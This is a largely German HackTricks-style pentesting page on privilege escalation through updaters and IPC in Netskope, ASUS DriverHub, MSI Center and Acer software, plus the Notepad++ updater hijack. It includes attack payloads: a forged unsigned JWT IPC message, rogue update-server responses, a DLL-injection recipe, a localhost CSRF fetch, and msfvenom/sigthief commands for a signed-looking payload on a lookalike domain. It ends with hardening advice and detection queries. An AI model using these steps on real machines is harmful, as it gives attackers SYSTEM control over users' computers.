# Abusing Enterprise Auto-Updaters and Privileged IPC (e.g., Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

Diese Seite verallgemeinert eine Klasse von Windows local privilege escalation chains, die in Enterprise-Endpoint-Agenten und Updatern gefunden werden und eine niedrigschwellige IPC-Oberfläche sowie einen privilegierten Update-Flow bereitstellen. Ein repräsentatives Beispiel ist Netskope Client for Windows < R129 (CVE-2025-0309), bei dem ein low-privileged user die Enrollment auf einen attacker-controlled Server erzwingen und anschließend ein bösartiges MSI liefern kann, das vom SYSTEM-Dienst installiert wird.

Wichtige Ideen, die Sie gegen ähnliche Produkte wiederverwenden können:
- Missbrauche die localhost IPC eines privilegierten Dienstes, um eine erneute Enrollment oder Neukonfiguration auf einen attacker-controlled Server zu erzwingen.
- Implementiere die Update-Endpunkte des Vendors, liefere eine rogue Trusted Root CA und weise den updater auf ein bösartiges, „signed“ package.
- Umgehe schwache Signer-Prüfungen (CN allow-lists), optionale digest-Flags und laxere MSI-Eigenschaften.
- Wenn IPC „encrypted“ ist, leite den key/IV aus weltlesbaren Maschinen-Identifiers ab, die in der registry gespeichert sind.
- Wenn der Dienst Aufrufer nach image path/process name einschränkt, injecte in einen allow-listed Prozess oder starte einen suspended Prozess und bootstrappe deine DLL via einen minimalen thread-context patch.

---
## 1) Forcing enrollment to an attacker server via localhost IPC

Viele Agenten liefern einen user-mode UI-Prozess mit, der über localhost TCP mittels JSON mit einem SYSTEM-Dienst kommuniziert.

Observed in Netskope:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Exploit flow:
1) Craft a JWT enrollment token whose claims control the backend host (e.g., AddonUrl). Use alg=None so no signature is required.
2) Send the IPC message invoking the provisioning command with your JWT and tenant name:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) Der Service beginnt, deinen rogue Server für enrollment/config anzusprechen, z. B.:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Hinweise:
- Wenn die caller verification path/name-basiert ist, leite die Anfrage von einem allow-listed vendor binary aus (siehe §4).

---
## 2) Hijacking the update channel to run code as SYSTEM

Sobald der Client mit deinem Server spricht, implementiere die erwarteten Endpunkte und lenke ihn auf ein attacker MSI. Typische Sequenz:

1) /v2/config/org/clientconfig → Gib eine JSON-Konfiguration mit einem sehr kurzen updater interval zurück, z. B.:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Return a PEM CA certificate. The service installs it into the Local Machine Trusted Root store.
3) /v2/checkupdate → Supply metadata pointing to a malicious MSI and a fake version.

Bypassing common checks seen in the wild:
- Signer CN allow-list: the service may only check the Subject CN equals “netSkope Inc” or “Netskope, Inc.”. Your rogue CA can issue a leaf with that CN and sign the MSI.
- CERT_DIGEST property: include a benign MSI property named CERT_DIGEST. No enforcement at install.
- Optional digest enforcement: config flag (e.g., check_msi_digest=false) disables extra cryptographic validation.

Result: the SYSTEM service installs your MSI from
C:\ProgramData\Netskope\stAgent\data\*.msi
executing arbitrary code as NT AUTHORITY\SYSTEM.

---
## 3) Forging encrypted IPC requests (when present)

From R127, Netskope wrapped IPC JSON in an encryptData field that looks like Base64. Reversing showed AES with key/IV derived from registry values readable by any user:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Attackers can reproduce encryption and send valid encrypted commands from a standard user. General tip: if an agent suddenly “encrypts” its IPC, look for device IDs, product GUIDs, install IDs under HKLM as material.

---
## 4) Bypassing IPC caller allow-lists (path/name checks)

Some services try to authenticate the peer by resolving the TCP connection’s PID and comparing the image path/name against allow-listed vendor binaries located under Program Files (e.g., stagentui.exe, bwansvc.exe, epdlp.exe).

Two practical bypasses:
- DLL injection into an allow-listed process (e.g., nsdiag.exe) and proxy IPC from inside it.
- Spawn an allow-listed binary suspended and bootstrap your proxy DLL without CreateRemoteThread (see §5) to satisfy driver-enforced tamper rules.

---
## 5) Tamper-protection friendly injection: suspended process + NtContinue patch

Products often ship a minifilter/OB callbacks driver (e.g., Stadrv) to strip dangerous rights from handles to protected processes:
- Process: removes PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: restricts to THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

A reliable user-mode loader that respects these constraints:
1) CreateProcess of a vendor binary with CREATE_SUSPENDED.
2) Obtain handles you’re still allowed to: PROCESS_VM_WRITE | PROCESS_VM_OPERATION on the process, and a thread handle with THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (or just THREAD_RESUME if you patch code at a known RIP).
3) Overwrite ntdll!NtContinue (or other early, guaranteed-mapped thunk) with a tiny stub that calls LoadLibraryW on your DLL path, then jumps back.
4) ResumeThread to trigger your stub in-process, loading your DLL.

Because you never used PROCESS_CREATE_THREAD or PROCESS_SUSPEND_RESUME on an already-protected process (you created it), the driver’s policy is satisfied.

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) automates a rogue CA, malicious MSI signing, and serves the needed endpoints: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.
- UpSkope is a custom IPC client that crafts arbitrary (optionally AES-encrypted) IPC messages and includes the suspended-process injection to originate from an allow-listed binary.

---
## 1) Browser-to-localhost CSRF against privileged HTTP APIs (ASUS DriverHub)

DriverHub ships a user-mode HTTP service (ADU.exe) on 127.0.0.1:53000 that expects browser calls coming from https://driverhub.asus.com. The origin filter simply performs `string_contains(".asus.com")` over the Origin header and over download URLs exposed by `/asus/v1.0/*`. Any attacker-controlled host such as `https://driverhub.asus.com.attacker.tld` therefore passes the check and can issue state-changing requests from JavaScript. See [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) for additional bypass patterns.

Practical flow:
1) Register a domain that embeds `.asus.com` and host a malicious webpage there.
2) Use `fetch` or XHR to call a privileged endpoint (e.g., `Reboot`, `UpdateApp`) on `http://127.0.0.1:53000`.
3) Send the JSON body expected by the handler – the packed frontend JS shows the schema below.
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
Sogar die unten gezeigte PowerShell CLI funktioniert, wenn der Origin-Header auf den vertrauenswürdigen Wert gefälscht wird:
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Jeder Browserbesuch der Angreiferseite wird damit zu einem 1-Click (oder 0-Click via `onload`) lokalen CSRF, der einen SYSTEM-Helfer auslöst.

---
## 2) Insecure code-signing verification & certificate cloning (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` lädt beliebige Executables herunter, die im JSON-Body angegeben sind, und cached sie in `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. Die Validierung der Download-URL verwendet dieselbe Substring-Logik, daher wird `http://updates.asus.com.attacker.tld:8000/payload.exe` akzeptiert. Nach dem Download prüft ADU.exe lediglich, dass die PE eine Signatur enthält und dass der Subject-String mit ASUS übereinstimmt, bevor sie sie ausführt – kein `WinVerifyTrust`, keine Chain-Validierung.

Um den Flow zu weaponizen:
1) Erstelle ein payload (z. B. `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Klone ASUS’ Signer hinein (z. B. `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Hoste `pwn.exe` auf einer `.asus.com`-Lookalike-Domain und trigger UpdateApp via dem oben beschriebenen Browser-CSRF.

Weil sowohl Origin- als auch URL-Filter substring-basiert sind und der Signer-Check nur Strings vergleicht, zieht DriverHub die Angreifer-Binary und führt sie im erhöhten Kontext aus.

---
## 1) TOCTOU inside updater copy/execute paths (MSI Center CMD_AutoUpdateSDK)

Der SYSTEM-Service von MSI Center exponiert ein TCP-Protokoll, bei dem jedes Frame `4-byte ComponentID || 8-byte CommandID || ASCII arguments` ist. Die Kernkomponente (Component ID `0f 27 00 00`) liefert `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Deren Handler:
1) kopiert das übergebene Executable nach `C:\Windows\Temp\MSI Center SDK.exe`.
2) verifiziert die Signatur via `CS_CommonAPI.EX_CA::Verify` (certificate subject muss “MICRO-STAR INTERNATIONAL CO., LTD.” entsprechen und `WinVerifyTrust` muss erfolgreich sein).
3) erstellt eine scheduled task, die die Temp-Datei als SYSTEM mit angreifer-kontrollierten Argumenten ausführt.

Die kopierte Datei wird zwischen der Verifikation und `ExecuteTask()` nicht gesperrt. Ein Angreifer kann:
- Frame A senden, das auf ein legitimes MSI-signed Binary zeigt (garantiert, dass die Signaturprüfung besteht und die Task in die Queue kommt).
- dieses mit wiederholten Frame B-Nachrichten rasen, die auf ein bösartiges Payload zeigen und `MSI Center SDK.exe` unmittelbar nach Abschluss der Verifikation überschreiben.

Wenn der Scheduler feuert, führt er das überschriebenen Payload unter SYSTEM aus, obwohl die ursprüngliche Datei verifiziert wurde. Zuverlässige Exploits nutzen zwei goroutines/Threads, die CMD_AutoUpdateSDK spammen, bis das TOCTOU-Fenster gewonnen ist.

---
## 2) Abusing custom SYSTEM-level IPC & impersonation (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- Jedes Plugin/DLL, das von `MSI.CentralServer.exe` geladen wird, erhält eine Component ID, die unter `HKLM\SOFTWARE\MSI\MSI_CentralServer` gespeichert ist. Die ersten 4 Bytes eines Frames wählen diese Komponente aus und erlauben es Angreifern, Befehle an beliebige Module zu routen.
- Plugins können eigene Task-Runner definieren. `Support\API_Support.dll` exponiert `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` und ruft direkt `API_Support.EX_Task::ExecuteTask()` ohne **Signature Validation** auf – jeder lokale Benutzer kann damit auf `C:\Users\<user>\Desktop\payload.exe` zeigen und deterministisch SYSTEM-Ausführung erhalten.
- Das Sniffen des Loopback mit Wireshark oder das Instrumentieren der .NET-Binaries in dnSpy offenbart schnell das Component ↔ Command-Mapping; eigene Go-/Python-Clients können die Frames dann replayen.

### Acer Control Centre named pipes & impersonation levels
- `ACCSvc.exe` (SYSTEM) exponiert `\\.\pipe\treadstone_service_LightMode`, und dessen discretionary ACL erlaubt Remote-Clients (z. B. `\\TARGET\pipe\treadstone_service_LightMode`). Das Senden der Command ID `7` mit einem Dateipfad ruft die Prozess-Spawn-Routine des Services auf.
- Die Client-Bibliothek serialisiert ein Magic-Terminator-Byte (113) zusammen mit den Args. Dynamische Instrumentierung mit Frida/`TsDotNetLib` (siehe [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) für Instrumentation-Tipps) zeigt, dass der native Handler diesen Wert auf ein `SECURITY_IMPERSONATION_LEVEL` und eine Integrity SID abbildet, bevor `CreateProcessAsUser` aufgerufen wird.
- Das Tauschen von 113 (`0x71`) gegen 114 (`0x72`) landet im generischen Branch, der das volle SYSTEM-Token behält und eine High-Integrity SID (`S-1-16-12288`) setzt. Die gestartete Binary läuft daher als uneingeschränktes SYSTEM, sowohl lokal als auch über Maschinen hinweg.
- Kombiniert man das mit dem exponierten Installer-Flag (`Setup.exe -nocheck`), lässt sich ACC selbst auf Lab-VMs installieren und die Pipe ohne Vendor-Hardware testen.

Diese IPC-Bugs unterstreichen, warum localhost-Services gegenseitige Authentifizierung (ALPC SIDs, `ImpersonationLevel=Impersonation`-Filter, Token-Filtering) durchsetzen müssen und warum der “run arbitrary binary”-Helper jedes Moduls dieselben Signer-Validierungen teilen muss.

---
## Remote supply-chain hijack via weak updater validation (WinGUp / Notepad++)

Ältere WinGUp-basierte Notepad++ Updater haben die Update-Authentizität nicht vollständig geprüft. Wenn Angreifer den Hosting-Provider des Update-Servers kompromittierten, konnten sie das XML-Manifest manipulieren und nur ausgewählte Clients zu Angreifer-URLs umleiten. Da der Client jede HTTPS-Antwort akzeptierte, ohne sowohl eine vertrauenswürdige Zertifikatskette als auch eine gültige PE-Signatur durchzusetzen, luden Opfer und führten ein trojanisiertes NSIS `update.exe` aus.

Operational flow (kein lokaler Exploit erforderlich):
1. Infrastructure interception: Kompromittiere CDN/Hosting und beantworte Update-Checks mit Angreifer-Metadaten, die auf eine bösartige Download-URL zeigen.
2. Trojanized NSIS: Der Installer lädt/führt ein payload aus und missbraucht zwei Ausführungsketten:
- Bring-your-own signed binary + sideload: Packe das signierte Bitdefender `BluetoothService.exe` bei und lege eine bösartige `log.dll` in seinen Search-Path. Wenn das signierte Binary läuft, sideloadet Windows `log.dll`, die den Chrysalis-Backdoor entschlüsselt und reflectively lädt (Warbird-protected + API-Hashing, um statische Erkennung zu erschweren).
- Scripted shellcode injection: NSIS führt ein kompiliertes Lua-Skript aus, das Win32-APIs (z. B. `EnumWindowStationsW`) nutzt, um Shellcode zu injizieren und einen Cobalt Strike Beacon zu stagen.

Hardening-/Detection-Empfehlungen für jeden Auto-Updater:
- Erzwinge Zertifikat- + Signatur-Verification des heruntergeladenen Installers (pinne den Vendor-Signer, lehne mismatched CN/Chain ab) und signiere das Update-Manifest selbst (z. B. XMLDSig). Blockiere manifest-gesteuerte Redirects, solange sie nicht validiert sind.
- Betrachte BYO signed binary sideloading als Post-Download-Detection-Pivot: Alarme auslösen, wenn ein signiertes Vendor-EXE eine DLL mit einem Namen lädt, der außerhalb seines kanonischen Install-Pfads liegt (z. B. Bitdefender lädt `log.dll` aus Temp/Downloads) und wenn ein Updater Installer aus Temp droppt/ausführt, die keine Vendor-Signaturen haben.
- Überwache malware-spezifische Artefakte, die in dieser Kette beobachtet wurden (nützlich als generische Pivots): mutex `Global\Jdhfv_1.0.1`, anomale `gup.exe`-Schreibvorgänge nach `%TEMP%` und Lua-gesteuerte Shellcode-Injection-Stages.

<details>
<summary>Cortex XDR XQL – Bitdefender-signed EXE sideloading <code>log.dll</code> (T1574.001)</summary>
```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```
</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> startet einen anderen Installer als Notepad++</summary>
```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```
</details>

Diese Muster verallgemeinern sich auf jeden Updater, der unsigned manifests akzeptiert oder es versäumt, installer signers zu pinnen—network hijack + malicious installer + BYO-signed sideloading führen zu remote code execution unter dem Vorwand “vertrauenswürdiger” Updates.

---
## Referenzen
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [Unit 42 – Nation-State Actors Exploit Notepad++ Supply Chain](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [Notepad++ – hijacked infrastructure incident update](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)

{{#include ../../banners/hacktricks-training.md}}
